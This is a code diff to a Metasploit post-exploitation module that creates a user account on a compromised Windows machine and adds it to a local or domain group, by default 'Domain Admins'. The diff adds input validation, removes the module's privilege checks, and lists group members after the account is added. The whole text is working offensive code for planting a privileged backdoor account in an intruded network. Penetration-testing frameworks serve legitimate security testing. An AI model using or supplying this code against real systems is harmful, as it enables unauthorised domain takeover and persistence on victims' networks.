@@ -8,7 +8,7 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Exploit::Deprecated
 
-  # moved_from 'post/windows/manage/add_user_domain'
+  moved_from 'post/windows/manage/add_user_domain'
 
   def initialize(info={})
     super( update_info( info,
@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('USERNAME',        [ true,  'The username of the user to add (not-qualified, e.g. BOB)' ]),
         OptString.new('PASSWORD',        [ false, 'The password of the user account to be created' ]),
-        OptString.new('SERVER_NAME', [ false, 'DNS or NetBIOS name of remote server on which to add user, e.g. \\\\XXX.kali-team.cn']),
+        OptString.new('SERVER_NAME', [ false, 'DNS or NetBIOS name of remote server on which to add user, e.g. \\\\XXX.kali-team.cn.(Escape sequences:\\\\\\\\ => \\\\)']),
         OptString.new('GROUP',   [ false, 'The local group to which the specified users or global groups will be added.(if it not exists)']),
         OptBool.new('DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', true ]),
         OptBool.new('ADD_TO_DOMAIN', [true,  'Add to Domain if true, Add to Local if false', false]),
@@ -112,6 +112,10 @@ def local_mode()
     datastore['GROUP'] = 'administrators'
     print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
   end
+  if datastore['SERVER_NAME'][0,2] != '\\\\'
+    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
+    return nil
+  end
   addr_username    = alloc_and_write_str(datastore['USERNAME'])
   addr_password     = alloc_and_write_str(datastore['PASSWORD'])
   addr_group   = alloc_and_write_str(datastore['GROUP'])
@@ -175,7 +179,7 @@ end
 
 def domain_mode()
   ## enum domain
-  domain = get_domain()
+  domain = get_domain(nil, 'DomainControllerName')
   if domain
     # primary_domain = domain.split('.')[0].upcase.to_s
     print_good("Found Domain : #{domain}")
@@ -183,20 +187,17 @@ def domain_mode()
     print_error("Oh, Domain server not found.")
     return false
   end
-  unless is_admin?
-    print_error("You don't have enough privileges. Try getsystem.")
-    return false
-  end
-  privs = session.sys.config.getprivs
-  if privs.include?("SeIncreaseQuotaPrivilege")
-    print_good("Has pass the priv check")
-  else
-    print_error("Abort! Did not pass the priv check")
-    return false
-  end
   if datastore['GROUP'] == nil
     datastore['GROUP'] = 'Domain Admins'
     print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+  end
+  if datastore['SERVER_NAME'] == nil
+    datastore['SERVER_NAME'] = domain
+    print_status("You have not set up a server_name. The default is '#{datastore['SERVER_NAME']}' " )
+  end
+  if datastore['SERVER_NAME'][0,2] != '\\\\'
+    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
+    return nil
   end
   addr_username    = alloc_and_write_str(datastore['USERNAME'])
   addr_password     = alloc_and_write_str(datastore['PASSWORD'])
@@ -251,6 +252,10 @@ def domain_mode()
     print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
   else
     check_result(result)
+  end
+  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
+  if domain_admins
+    print_good("Now,Domain Group Members:"<<domain_admins.to_s)
   end
   # free memory
   client.railgun.multi([
